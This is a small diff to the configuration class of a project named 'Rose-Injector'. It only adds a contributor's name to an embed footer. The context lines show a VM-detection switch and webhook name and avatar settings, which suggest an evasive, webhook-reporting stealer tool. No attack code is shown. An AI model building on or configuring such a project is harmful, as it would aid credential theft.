@@ -24,7 +24,7 @@ class Config:
         self.vmdetection = True
         
         self.eb_color = 16711680
-        self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu | https://github.com/DamagingRose/Rose-Injector'
+        self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu and xpierroz | https://github.com/DamagingRose/Rose-Injector'
         self.wh_avatar = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/Rose.jpeg'
         self.wh_name = 'Rose-Injector'
 
